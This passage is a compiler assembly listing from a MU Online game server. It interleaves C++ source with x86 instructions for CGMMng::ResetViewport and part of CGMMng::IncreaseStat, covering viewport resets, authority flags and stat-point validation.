  001f1	f3 0f 2a 80 10
	01 00 00	 cvtsi2ss xmm0, DWORD PTR [eax+272]
  001f9	8b 4d 08	 mov	 ecx, DWORD PTR _lpObj$[ebp]
  001fc	f3 0f 58 81 d4
	00 00 00	 addss	 xmm0, DWORD PTR [ecx+212]
  00204	f3 0f 2c d0	 cvttss2si edx, xmm0
  00208	66 89 95 54 ec
	ff ff		 mov	 WORD PTR _pjMsg$[ebp+32], dx

; 4975 : #ifdef ADD_SHIELD_POINT_01_20060403
; 4976 : 	pjMsg.wShield		= (WORD)(lpObj->iShield);
; 4977 : 	pjMsg.wMaxShield	= (WORD)(lpObj->iMaxShield + lpObj->iAddShield);
; 4978 : #endif
; 4979 : 
; 4980 : 	pjMsg.CtlCode		= 0x00;

  0020f	c6 85 61 ec ff
	ff 00		 mov	 BYTE PTR _pjMsg$[ebp+45], 0

; 4981 : 
; 4982 : 	if(lpObj->Authority == AUTHORITY_EVENT_GM)

  00216	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  00219	83 b8 a4 01 00
	00 20		 cmp	 DWORD PTR [eax+420], 32	; 00000020H
  00220	75 12		 jne	 SHORT $LN11@ResetViewp

; 4983 : 		pjMsg.CtlCode	|= 0x08;

  00222	0f b6 85 61 ec
	ff ff		 movzx	 eax, BYTE PTR _pjMsg$[ebp+45]
  00229	83 c8 08	 or	 eax, 8
  0022c	88 85 61 ec ff
	ff		 mov	 BYTE PTR _pjMsg$[ebp+45], al
  00232	eb 3a		 jmp	 SHORT $LN15@ResetViewp
$LN11@ResetViewp:

; 4984 : 	else if(lpObj->Authority == AUTHORITY_ADMIN)

  00234	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  00237	83 b8 a4 01 00
	00 02		 cmp	 DWORD PTR [eax+420], 2
  0023e	75 12		 jne	 SHORT $LN13@ResetViewp

; 4985 : 		pjMsg.CtlCode	|= 0x20;

  00240	0f b6 85 61 ec
	ff ff		 movzx	 eax, BYTE PTR _pjMsg$[ebp+45]
  00247	83 c8 20	 or	 eax, 32			; 00000020H
  0024a	88 85 61 ec ff
	ff		 mov	 BYTE PTR _pjMsg$[ebp+45], al
  00250	eb 1c		 jmp	 SHORT $LN15@ResetViewp
$LN13@ResetViewp:

; 4986 : 	else if(lpObj->Authority == AUTHORITY_SUPER_ADMIN)

  00252	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  00255	83 b8 a4 01 00
	00 40		 cmp	 DWORD PTR [eax+420], 64	; 00000040H
  0025c	75 10		 jne	 SHORT $LN15@ResetViewp

; 4987 : 		pjMsg.CtlCode	|= 0x40;

  0025e	0f b6 85 61 ec
	ff ff		 movzx	 eax, BYTE PTR _pjMsg$[ebp+45]
  00265	83 c8 40	 or	 eax, 64			; 00000040H
  00268	88 85 61 ec ff
	ff		 mov	 BYTE PTR _pjMsg$[ebp+45], al
$LN15@ResetViewp:

; 4988 : 
; 4989 : 	if((lpObj->Penalty & CTLCODE_ITEMDONTTOUCH) == CTLCODE_ITEMDONTTOUCH)

  0026e	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  00271	8b 88 a8 01 00
	00		 mov	 ecx, DWORD PTR [eax+424]
  00277	83 e1 04	 and	 ecx, 4
  0027a	74 10		 je	 SHORT $LN16@ResetViewp

; 4990 : 		pjMsg.CtlCode	|= 0x02;

  0027c	0f b6 85 61 ec
	ff ff		 movzx	 eax, BYTE PTR _pjMsg$[ebp+45]
  00283	83 c8 02	 or	 eax, 2
  00286	88 85 61 ec ff
	ff		 mov	 BYTE PTR _pjMsg$[ebp+45], al
$LN16@ResetViewp:

; 4991 : 
; 4992 : #ifdef NEW_FORSKYLAND2
; 4993 : 	pjMsg.BP			= lpObj->BP;

  0028c	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  0028f	66 8b 88 e8 00
	00 00		 mov	 cx, WORD PTR [eax+232]
  00296	66 89 8d 56 ec
	ff ff		 mov	 WORD PTR _pjMsg$[ebp+34], cx

; 4994 : 	pjMsg.MaxBP			= lpObj->MaxBP+lpObj->AddBP;

  0029d	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  002a0	8b 88 ec 00 00
	00		 mov	 ecx, DWORD PTR [eax+236]
  002a6	8b 55 08	 mov	 edx, DWORD PTR _lpObj$[ebp]
  002a9	03 8a f0 00 00
	00		 add	 ecx, DWORD PTR [edx+240]
  002af	66 89 8d 58 ec
	ff ff		 mov	 WORD PTR _pjMsg$[ebp+36], cx

; 4995 : #endif
; 4996 : 
; 4997 : #ifdef DARKLORD_WORK
; 4998 : 	pjMsg.Leadership = lpObj->Leadership;

  002b6	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  002b9	66 8b 88 d8 00
	00 00		 mov	 cx, WORD PTR [eax+216]
  002c0	66 89 8d 66 ec
	ff ff		 mov	 WORD PTR _pjMsg$[ebp+50], cx

; 4999 : #endif
; 5000 : 
; 5001 : 	short AddPoint		= 0;

  002c7	33 c0		 xor	 eax, eax
  002c9	66 89 85 30 ec
	ff ff		 mov	 WORD PTR _AddPoint$[ebp], ax

; 5002 : 	short MaxAddPoint	= 0;

  002d0	33 c0		 xor	 eax, eax
  002d2	66 89 85 2c ec
	ff ff		 mov	 WORD PTR _MaxAddPoint$[ebp], ax

; 5003 : 
; 5004 : #ifdef ADD_MINUS_STAT_SYSTEM_USING_FRUIT_20050712
; 5005 : 	short MinusPoint	= 0;
; 5006 : 	short MaxMinusPoint = 0;
; 5007 : 	gObjGetStatPointState(lpObj->m_Index, AddPoint, MaxAddPoint, MinusPoint, MaxMinusPoint);
; 5008 : #else
; 5009 : 	gObjGetStatPointState(lpObj->m_Index, AddPoint, MaxAddPoint);

  002d9	8d 85 2c ec ff
	ff		 lea	 eax, DWORD PTR _MaxAddPoint$[ebp]
  002df	50		 push	 eax
  002e0	8d 8d 30 ec ff
	ff		 lea	 ecx, DWORD PTR _AddPoint$[ebp]
  002e6	51		 push	 ecx
  002e7	8b 55 08	 mov	 edx, DWORD PTR _lpObj$[ebp]
  002ea	8b 02		 mov	 eax, DWORD PTR [edx]
  002ec	50		 push	 eax
  002ed	e8 00 00 00 00	 call	 ?gObjGetStatPointState@@YAXHAAF0@Z ; gObjGetStatPointState
  002f2	83 c4 0c	 add	 esp, 12			; 0000000cH

; 5010 : #endif
; 5011 : 
; 5012 : 	pjMsg.AddPoint		= AddPoint;

  002f5	66 8b 85 30 ec
	ff ff		 mov	 ax, WORD PTR _AddPoint$[ebp]
  002fc	66 89 85 62 ec
	ff ff		 mov	 WORD PTR _pjMsg$[ebp+46], ax

; 5013 : 	pjMsg.MaxAddPoint	= MaxAddPoint;

  00303	66 8b 85 2c ec
	ff ff		 mov	 ax, WORD PTR _MaxAddPoint$[ebp]
  0030a	66 89 85 64 ec
	ff ff		 mov	 WORD PTR _pjMsg$[ebp+48], ax

; 5014 : 
; 5015 : #ifdef ADD_MINUS_STAT_SYSTEM_USING_FRUIT_20050712
; 5016 : 	pjMsg.wMinusPoint	= MinusPoint;
; 5017 : 	pjMsg.wMaxMinusPoint= MaxMinusPoint;
; 5018 : 
; 5019 : 	LogAddTD("[FRUIT System] [%s][%s] (MinusPoint:%d/PlusPoint:%d) (MaxMinus:%d/MaxPlus:%d)", 
; 5020 : 		lpObj->AccountID, lpObj->Name, MinusPoint, AddPoint, MaxMinusPoint, MaxAddPoint);
; 5021 : #endif
; 5022 : 
; 5023 : #ifdef ADD_MINUS_STAT_SYSTEM_USING_FRUIT_20050712
; 5024 : 	if( AddPoint<0 || AddPoint>MaxAddPoint  || MinusPoint<0 || MinusPoint>MaxMinusPoint )
; 5025 : 	{
; 5026 : 		LogAddTD("[FRUIT System] Character Stat Error [%s][%s] (MinusPoint:%d/PlusPoint:%d) (MaxMinus:%d/MaxPlus:%d)", 
; 5027 : 			lpObj->AccountID, lpObj->Name, MinusPoint, AddPoint, MaxMinusPoint, MaxAddPoint);
; 5028 : 	}
; 5029 : #else
; 5030 : 	if( AddPoint < 0 || AddPoint > MaxAddPoint)

  00311	0f bf 85 30 ec
	ff ff		 movsx	 eax, WORD PTR _AddPoint$[ebp]
  00318	85 c0		 test	 eax, eax
  0031a	7c 12		 jl	 SHORT $LN18@ResetViewp
  0031c	0f bf 85 30 ec
	ff ff		 movsx	 eax, WORD PTR _AddPoint$[ebp]
  00323	0f bf 8d 2c ec
	ff ff		 movsx	 ecx, WORD PTR _MaxAddPoint$[ebp]
  0032a	3b c1		 cmp	 eax, ecx
  0032c	7e 38		 jle	 SHORT $LN17@ResetViewp
$LN18@ResetViewp:

; 5031 : 	{
; 5032 : 		LogAddTD(lMsg.Get(500), lpObj->AccountID, lpObj->Name, AddPoint, MaxAddPoint);

  0032e	0f bf 85 2c ec
	ff ff		 movsx	 eax, WORD PTR _MaxAddPoint$[ebp]
  00335	50		 push	 eax
  00336	0f bf 8d 30 ec
	ff ff		 movsx	 ecx, WORD PTR _AddPoint$[ebp]
  0033d	51		 push	 ecx
  0033e	8b 55 08	 mov	 edx, DWORD PTR _lpObj$[ebp]
  00341	83 c2 73	 add	 edx, 115		; 00000073H
  00344	52		 push	 edx
  00345	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  00348	83 c0 68	 add	 eax, 104		; 00000068H
  0034b	50		 push	 eax
  0034c	68 f4 01 00 00	 push	 500			; 000001f4H
  00351	b9 00 00 00 00	 mov	 ecx, OFFSET ?lMsg@@3VCMsg@@A ; lMsg
  00356	ff 15 00 00 00
	00		 call	 DWORD PTR __imp_?Get@CMsg@@QAEPADH@Z
  0035c	50		 push	 eax
  0035d	ff 15 00 00 00
	00		 call	 DWORD PTR ?LogAddTD@@3P6AXPADZZA ; LogAddTD
  00363	83 c4 14	 add	 esp, 20			; 00000014H
$LN17@ResetViewp:

; 5033 : 	}
; 5034 : #endif
; 5035 : 
; 5036 : #ifdef EXTEND_LOG_SYSTEM_20060202
; 5037 : 	g_QuestInfo.QuestInfoSave(lpObj);
; 5038 : #endif // EXTEND_LOG_SYSTEM_20060202
; 5039 : 
; 5040 : 	::DataSend(lpObj->m_Index, (LPBYTE)&pjMsg, pjMsg.h.size);

  00366	0f b6 85 35 ec
	ff ff		 movzx	 eax, BYTE PTR _pjMsg$[ebp+1]
  0036d	50		 push	 eax
  0036e	8d 8d 34 ec ff
	ff		 lea	 ecx, DWORD PTR _pjMsg$[ebp]
  00374	51		 push	 ecx
  00375	8b 55 08	 mov	 edx, DWORD PTR _lpObj$[ebp]
  00378	8b 02		 mov	 eax, DWORD PTR [edx]
  0037a	50		 push	 eax
  0037b	e8 00 00 00 00	 call	 ?DataSend@@YAHHPAEK@Z	; DataSend
  00380	83 c4 0c	 add	 esp, 12			; 0000000cH

; 5041 : 
; 5042 : 	for(int i=0; i<MAXVIEWPORTOBJECT; i++) 

  00383	c7 85 28 ec ff
	ff 00 00 00 00	 mov	 DWORD PTR _i$5[ebp], 0
  0038d	eb 0f		 jmp	 SHORT $LN4@ResetViewp
$LN2@ResetViewp:
  0038f	8b 85 28 ec ff
	ff		 mov	 eax, DWORD PTR _i$5[ebp]
  00395	83 c0 01	 add	 eax, 1
  00398	89 85 28 ec ff
	ff		 mov	 DWORD PTR _i$5[ebp], eax
$LN4@ResetViewp:
  0039e	83 bd 28 ec ff
	ff 4b		 cmp	 DWORD PTR _i$5[ebp], 75	; 0000004bH
  003a5	0f 8d c1 01 00
	00		 jge	 $LN3@ResetViewp

; 5043 : 	{
; 5044 : 		if(lpObj->VpPlayer[i].state == STVP_CREATE || lpObj->VpPlayer[i].state == STVP_PLAYING)

  003ab	6b 85 28 ec ff
	ff 0c		 imul	 eax, DWORD PTR _i$5[ebp], 12
  003b2	8b 4d 08	 mov	 ecx, DWORD PTR _lpObj$[ebp]
  003b5	0f be 94 01 64
	03 00 00	 movsx	 edx, BYTE PTR [ecx+eax+868]
  003bd	83 fa 01	 cmp	 edx, 1
  003c0	74 1b		 je	 SHORT $LN20@ResetViewp
  003c2	6b 85 28 ec ff
	ff 0c		 imul	 eax, DWORD PTR _i$5[ebp], 12
  003c9	8b 4d 08	 mov	 ecx, DWORD PTR _lpObj$[ebp]
  003cc	0f be 94 01 64
	03 00 00	 movsx	 edx, BYTE PTR [ecx+eax+868]
  003d4	83 fa 02	 cmp	 edx, 2
  003d7	0f 85 ac 00 00
	00		 jne	 $LN6@ResetViewp
$LN20@ResetViewp:

; 5045 : 		{
; 5046 : 			LPOBJECTSTRUCT lpTempObj = &gObj[lpObj->VpPlayer[i].number];

  003dd	6b 85 28 ec ff
	ff 0c		 imul	 eax, DWORD PTR _i$5[ebp], 12
  003e4	8b 4d 08	 mov	 ecx, DWORD PTR _lpObj$[ebp]
  003e7	0f bf 94 01 66
	03 00 00	 movsx	 edx, WORD PTR [ecx+eax+870]
  003ef	69 c2 a0 1b 00
	00		 imul	 eax, edx, 7072
  003f5	03 05 00 00 00
	00		 add	 eax, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  003fb	89 85 24 ec ff
	ff		 mov	 DWORD PTR _lpTempObj$4[ebp], eax

; 5047 : 
; 5048 : 			for(int n=0; n<MAXVIEWPORTOBJECT; n++)

  00401	c7 85 20 ec ff
	ff 00 00 00 00	 mov	 DWORD PTR _n$3[ebp], 0
  0040b	eb 0f		 jmp	 SHORT $LN7@ResetViewp
$LN5@ResetViewp:
  0040d	8b 85 20 ec ff
	ff		 mov	 eax, DWORD PTR _n$3[ebp]
  00413	83 c0 01	 add	 eax, 1
  00416	89 85 20 ec ff
	ff		 mov	 DWORD PTR _n$3[ebp], eax
$LN7@ResetViewp:
  0041c	83 bd 20 ec ff
	ff 4b		 cmp	 DWORD PTR _n$3[ebp], 75	; 0000004bH
  00423	7d 64		 jge	 SHORT $LN6@ResetViewp

; 5049 : 			{
; 5050 : 				if(lpTempObj->VpPlayer[n].number == lpObj->m_Index)

  00425	6b 85 20 ec ff
	ff 0c		 imul	 eax, DWORD PTR _n$3[ebp], 12
  0042c	8b 8d 24 ec ff
	ff		 mov	 ecx, DWORD PTR _lpTempObj$4[ebp]
  00432	0f bf 94 01 66
	03 00 00	 movsx	 edx, WORD PTR [ecx+eax+870]
  0043a	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  0043d	3b 10		 cmp	 edx, DWORD PTR [eax]
  0043f	75 15		 jne	 SHORT $LN21@ResetViewp

; 5051 : 				{
; 5052 : 					lpTempObj->VpPlayer[n].state  = STVP_NONE;

  00441	6b 85 20 ec ff
	ff 0c		 imul	 eax, DWORD PTR _n$3[ebp], 12
  00448	8b 8d 24 ec ff
	ff		 mov	 ecx, DWORD PTR _lpTempObj$4[ebp]
  0044e	c6 84 01 64 03
	00 00 00	 mov	 BYTE PTR [ecx+eax+868], 0
$LN21@ResetViewp:

; 5053 : 				}
; 5054 : 
; 5055 : 				if(lpTempObj->VpPlayer2[n].number == lpObj->m_Index)

  00456	6b 85 20 ec ff
	ff 0c		 imul	 eax, DWORD PTR _n$3[ebp], 12
  0045d	8b 8d 24 ec ff
	ff		 mov	 ecx, DWORD PTR _lpTempObj$4[ebp]
  00463	0f bf 94 01 ea
	06 00 00	 movsx	 edx, WORD PTR [ecx+eax+1770]
  0046b	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  0046e	3b 10		 cmp	 edx, DWORD PTR [eax]
  00470	75 15		 jne	 SHORT $LN22@ResetViewp

; 5056 : 				{
; 5057 : 					lpTempObj->VpPlayer2[n].state  = STVP_NONE;

  00472	6b 85 20 ec ff
	ff 0c		 imul	 eax, DWORD PTR _n$3[ebp], 12
  00479	8b 8d 24 ec ff
	ff		 mov	 ecx, DWORD PTR _lpTempObj$4[ebp]
  0047f	c6 84 01 e8 06
	00 00 00	 mov	 BYTE PTR [ecx+eax+1768], 0
$LN22@ResetViewp:

; 5058 : 				}
; 5059 : 			}

  00487	eb 84		 jmp	 SHORT $LN5@ResetViewp
$LN6@ResetViewp:

; 5060 : 		}
; 5061 : 
; 5062 : 		if(lpObj->VpPlayer2[i].state == STVP_CREATE || lpObj->VpPlayer2[i].state == STVP_PLAYING)

  00489	6b 85 28 ec ff
	ff 0c		 imul	 eax, DWORD PTR _i$5[ebp], 12
  00490	8b 4d 08	 mov	 ecx, DWORD PTR _lpObj$[ebp]
  00493	0f be 94 01 e8
	06 00 00	 movsx	 edx, BYTE PTR [ecx+eax+1768]
  0049b	83 fa 01	 cmp	 edx, 1
  0049e	74 1b		 je	 SHORT $LN24@ResetViewp
  004a0	6b 85 28 ec ff
	ff 0c		 imul	 eax, DWORD PTR _i$5[ebp], 12
  004a7	8b 4d 08	 mov	 ecx, DWORD PTR _lpObj$[ebp]
  004aa	0f be 94 01 e8
	06 00 00	 movsx	 edx, BYTE PTR [ecx+eax+1768]
  004b2	83 fa 02	 cmp	 edx, 2
  004b5	0f 85 ac 00 00
	00		 jne	 $LN9@ResetViewp
$LN24@ResetViewp:

; 5063 : 		{
; 5064 : 			LPOBJECTSTRUCT lpTempObj = &gObj[lpObj->VpPlayer2[i].number];

  004bb	6b 85 28 ec ff
	ff 0c		 imul	 eax, DWORD PTR _i$5[ebp], 12
  004c2	8b 4d 08	 mov	 ecx, DWORD PTR _lpObj$[ebp]
  004c5	0f bf 94 01 ea
	06 00 00	 movsx	 edx, WORD PTR [ecx+eax+1770]
  004cd	69 c2 a0 1b 00
	00		 imul	 eax, edx, 7072
  004d3	03 05 00 00 00
	00		 add	 eax, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  004d9	89 85 1c ec ff
	ff		 mov	 DWORD PTR _lpTempObj$2[ebp], eax

; 5065 : 
; 5066 : 			for(int n=0; n<MAXVIEWPORTOBJECT; n++)

  004df	c7 85 18 ec ff
	ff 00 00 00 00	 mov	 DWORD PTR _n$1[ebp], 0
  004e9	eb 0f		 jmp	 SHORT $LN10@ResetViewp
$LN8@ResetViewp:
  004eb	8b 85 18 ec ff
	ff		 mov	 eax, DWORD PTR _n$1[ebp]
  004f1	83 c0 01	 add	 eax, 1
  004f4	89 85 18 ec ff
	ff		 mov	 DWORD PTR _n$1[ebp], eax
$LN10@ResetViewp:
  004fa	83 bd 18 ec ff
	ff 4b		 cmp	 DWORD PTR _n$1[ebp], 75	; 0000004bH
  00501	7d 64		 jge	 SHORT $LN9@ResetViewp

; 5067 : 			{
; 5068 : 				if(lpTempObj->VpPlayer[n].number == lpObj->m_Index)

  00503	6b 85 18 ec ff
	ff 0c		 imul	 eax, DWORD PTR _n$1[ebp], 12
  0050a	8b 8d 1c ec ff
	ff		 mov	 ecx, DWORD PTR _lpTempObj$2[ebp]
  00510	0f bf 94 01 66
	03 00 00	 movsx	 edx, WORD PTR [ecx+eax+870]
  00518	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  0051b	3b 10		 cmp	 edx, DWORD PTR [eax]
  0051d	75 15		 jne	 SHORT $LN25@ResetViewp

; 5069 : 				{
; 5070 : 					lpTempObj->VpPlayer[n].state  = STVP_CREATE;

  0051f	6b 85 18 ec ff
	ff 0c		 imul	 eax, DWORD PTR _n$1[ebp], 12
  00526	8b 8d 1c ec ff
	ff		 mov	 ecx, DWORD PTR _lpTempObj$2[ebp]
  0052c	c6 84 01 64 03
	00 00 01	 mov	 BYTE PTR [ecx+eax+868], 1
$LN25@ResetViewp:

; 5071 : 				}
; 5072 : 
; 5073 : 				if(lpTempObj->VpPlayer2[n].number == lpObj->m_Index)

  00534	6b 85 18 ec ff
	ff 0c		 imul	 eax, DWORD PTR _n$1[ebp], 12
  0053b	8b 8d 1c ec ff
	ff		 mov	 ecx, DWORD PTR _lpTempObj$2[ebp]
  00541	0f bf 94 01 ea
	06 00 00	 movsx	 edx, WORD PTR [ecx+eax+1770]
  00549	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  0054c	3b 10		 cmp	 edx, DWORD PTR [eax]
  0054e	75 15		 jne	 SHORT $LN26@ResetViewp

; 5074 : 				{
; 5075 : 					lpTempObj->VpPlayer2[n].state  = STVP_CREATE;

  00550	6b 85 18 ec ff
	ff 0c		 imul	 eax, DWORD PTR _n$1[ebp], 12
  00557	8b 8d 1c ec ff
	ff		 mov	 ecx, DWORD PTR _lpTempObj$2[ebp]
  0055d	c6 84 01 e8 06
	00 00 01	 mov	 BYTE PTR [ecx+eax+1768], 1
$LN26@ResetViewp:

; 5076 : 				}
; 5077 : 			}

  00565	eb 84		 jmp	 SHORT $LN8@ResetViewp
$LN9@ResetViewp:

; 5078 : 		}
; 5079 : 	}

  00567	e9 23 fe ff ff	 jmp	 $LN2@ResetViewp
$LN3@ResetViewp:

; 5080 : 
; 5081 : 	gObjClearViewport(lpObj);

  0056c	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  0056f	50		 push	 eax
  00570	e8 00 00 00 00	 call	 ?gObjClearViewport@@YAXPAVOBJECTSTRUCT@@@Z ; gObjClearViewport
  00575	83 c4 04	 add	 esp, 4

; 5082 : 	CreateFrustrum(lpObj->X,lpObj->Y,lpObj->m_Index);

  00578	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  0057b	8b 08		 mov	 ecx, DWORD PTR [eax]
  0057d	51		 push	 ecx
  0057e	8b 55 08	 mov	 edx, DWORD PTR _lpObj$[ebp]
  00581	0f bf 82 06 01
	00 00		 movsx	 eax, WORD PTR [edx+262]
  00588	50		 push	 eax
  00589	8b 4d 08	 mov	 ecx, DWORD PTR _lpObj$[ebp]
  0058c	0f bf 91 04 01
	00 00		 movsx	 edx, WORD PTR [ecx+260]
  00593	52		 push	 edx
  00594	e8 00 00 00 00	 call	 ?CreateFrustrum@@YAXHHH@Z ; CreateFrustrum
  00599	83 c4 0c	 add	 esp, 12			; 0000000cH

; 5083 : 	GCItemListSend(lpObj->m_Index);

  0059c	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  0059f	8b 08		 mov	 ecx, DWORD PTR [eax]
  005a1	51		 push	 ecx
  005a2	e8 00 00 00 00	 call	 ?GCItemListSend@@YAXH@Z	; GCItemListSend
  005a7	83 c4 04	 add	 esp, 4

; 5084 : 	GCMagicListMultiSend(lpObj);

  005aa	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  005ad	50		 push	 eax
  005ae	e8 00 00 00 00	 call	 ?GCMagicListMultiSend@@YAXPAVOBJECTSTRUCT@@@Z ; GCMagicListMultiSend
  005b3	83 c4 04	 add	 esp, 4

; 5085 : 
; 5086 : 	gObjViewportListProtocolCreate(lpObj);

  005b6	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  005b9	50		 push	 eax
  005ba	e8 00 00 00 00	 call	 ?gObjViewportListProtocolCreate@@YAXPAVOBJECTSTRUCT@@@Z ; gObjViewportListProtocolCreate
  005bf	83 c4 04	 add	 esp, 4

; 5087 : }

  005c2	5f		 pop	 edi
  005c3	5e		 pop	 esi
  005c4	5b		 pop	 ebx
  005c5	8b 4d fc	 mov	 ecx, DWORD PTR __$ArrayPad$[ebp]
  005c8	33 cd		 xor	 ecx, ebp
  005ca	e8 00 00 00 00	 call	 @__security_check_cookie@4
  005cf	8b e5		 mov	 esp, ebp
  005d1	5d		 pop	 ebp
  005d2	c2 04 00	 ret	 4
?ResetViewport@CGMMng@@QAEXPAVOBJECTSTRUCT@@@Z ENDP	; CGMMng::ResetViewport
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Mu Online\Mu-GS-Webzen-MC-10093\GameServer\GMMng.cpp
;	COMDAT ?IncreaseStat@CGMMng@@AAEXPAVOBJECTSTRUCT@@HW4INCREASE_STAT_ENUM@@@Z
_TEXT	SEGMENT
tv87 = -72						; size = 4
_this$ = -4						; size = 4
_lpObj$ = 8						; size = 4
_Points$ = 12						; size = 4
_type$ = 16						; size = 4
?IncreaseStat@CGMMng@@AAEXPAVOBJECTSTRUCT@@HW4INCREASE_STAT_ENUM@@@Z PROC ; CGMMng::IncreaseStat, COMDAT
; _this$ = ecx

; 4794 : {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 48	 sub	 esp, 72			; 00000048H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi
  00009	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 4795 : 	if(gObjIsConnected(lpObj->m_Index) == FALSE)

  0000c	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  0000f	8b 08		 mov	 ecx, DWORD PTR [eax]
  00011	51		 push	 ecx
  00012	e8 00 00 00 00	 call	 ?gObjIsConnected@@YAHH@Z ; gObjIsConnected
  00017	83 c4 04	 add	 esp, 4
  0001a	85 c0		 test	 eax, eax
  0001c	75 13		 jne	 SHORT $LN4@IncreaseSt

; 4796 : 	{
; 4797 : 		CloseClient(lpObj->m_Index);

  0001e	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  00021	8b 08		 mov	 ecx, DWORD PTR [eax]
  00023	51		 push	 ecx
  00024	e8 00 00 00 00	 call	 ?CloseClient@@YAXH@Z	; CloseClient
  00029	83 c4 04	 add	 esp, 4

; 4798 : 		return;

  0002c	e9 30 02 00 00	 jmp	 $LN1@IncreaseSt
$LN4@IncreaseSt:

; 4799 : 	}
; 4800 : 
; 4801 : 	if(Points < 1 || Points > g_GlobalConfig.m_iMax_Stats)

  00031	83 7d 0c 01	 cmp	 DWORD PTR _Points$[ebp], 1
  00035	7c 0b		 jl	 SHORT $LN6@IncreaseSt
  00037	8b 45 0c	 mov	 eax, DWORD PTR _Points$[ebp]
  0003a	3b 05 98 00 00
	00		 cmp	 eax, DWORD PTR ?g_GlobalConfig@@3VCGlobalConfig@@A+152
  00040	7e 05		 jle	 SHORT $LN5@IncreaseSt
$LN6@IncreaseSt:

; 4802 : 	{
; 4803 : 		return;

  00042	e9 1a 02 00 00	 jmp	 $LN1@IncreaseSt
$LN5@IncreaseSt:

; 4804 : 	}
; 4805 : 
; 4806 : 	if(Points > lpObj->LevelUpPoint)

  00047	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  0004a	8b 4d 0c	 mov	 ecx, DWORD PTR _Points$[ebp]
  0004d	3b 88 a4 00 00
	00		 cmp	 ecx, DWORD PTR [eax+164]
  00053	7e 1a		 jle	 SHORT $LN7@IncreaseSt

; 4807 : 	{
; 4808 : 		GCServerMsgStringSend("No tienes los suficientes puntos...", lpObj->m_Index, 0);

  00055	6a 00		 push	 0
  00057	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  0005a	8b 08		 mov	 ecx, DWORD PTR [eax]
  0005c	51		 push	 ecx
  0005d	68 00 00 00 00	 push	 OFFSET ??_C@_0CE@DPEEOBIE@No?5tienes?5los?5suficientes?5punto@
  00062	e8 00 00 00 00	 call	 ?GCServerMsgStringSend@@YAXPADHE@Z ; GCServerMsgStringSend
  00067	83 c4 0c	 add	 esp, 12			; 0000000cH

; 4809 : 		return;

  0006a	e9 f2 01 00 00	 jmp	 $LN1@IncreaseSt
$LN7@IncreaseSt:

; 4810 : 	}
; 4811 : 
; 4812 : 	if(lpObj->m_IfState.use > 0)

  0006f	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  00072	8a 88 56 0c 00
	00		 mov	 cl, BYTE PTR [eax+3158]
  00078	80 e1 03	 and	 cl, 3
  0007b	0f b6 d1	 movzx	 edx, cl
  0007e	85 d2		 test	 edx, edx
  00080	7e 1a		 jle	 SHORT $LN8@IncreaseSt

; 4813 : 	{
; 4814 : 		GCServerMsgStringSend("[ANTI-HACK] IMPOSIBLE SUBIR PUNTOS CUANDO MOVES ITEMS.", lpObj->m_Index, 0);

  00082	6a 00		 push	 0
  00084	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  00087	8b 08		 mov	 ecx, DWORD PTR [eax]
  00089	51		 push	 ecx
  0008a	68 00 00 00 00	 push	 OFFSET ??_C@_0DH@JNLNEIOF@?$FLANTI?9HACK?$FN?5IMPOSIBLE?5SUBIR?5PUN@
  0008f	e8 00 00 00 00	 call	 ?GCServerMsgStringSend@@YAXPADHE@Z ; GCServerMsgStringSend
  00094	83 c4 0c	 add	 esp, 12			; 0000000cH

; 4815 : 		return;

  00097	e9 c5 01 00 00	 jmp	 $LN1@IncreaseSt
$LN8@IncreaseSt:

; 4816 : 	}
; 4817 : 
; 4818 : 	switch(type)

  0009c	8b 45 10	 mov	 eax, DWORD PTR _type$[ebp]
  0009f	89 45 b8	 mov	 DWORD PTR tv87[ebp], eax
  000a2	83 7d b8 04	 cmp	 DWORD PTR tv87[ebp], 4
  000a6	0f 87 94 01 00
	00		 ja	 $LN2@IncreaseSt
  000ac	8b 4d b8	 mov	 ecx, DWORD PTR tv87[ebp]
  000af	ff 24 8d 00 00
	00 00		 jmp	 DWORD PTR $LN25@IncreaseSt[ecx*4]
$LN9@IncreaseSt:

; 4819 : 	{
; 4820 : 	case IS_STRENGTH:
; 4821 : 		{
; 4822 : 			if(lpObj->Strength+Points > g_GlobalConfig.m_iMax_Stats)

  000b6	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  000b9	0f b7 88 b4 00
	00 00		 movzx	 ecx, WORD PTR [eax+180]
  000c0	03 4d 0c	 add	 ecx, DWORD PTR _Points$[ebp]
  000c3	3b 0d 98 00 00
	00		 cmp	 ecx, DWORD PTR ?g_GlobalConfig@@3VCGlobalConfig@@A+152
  000c9	7e 20		 jle	 SHORT $LN10@IncreaseSt

; 4823 : 			{
; 4824 : 				Points = g_GlobalConfig.m_iMax_Stats - lpObj->Strength;

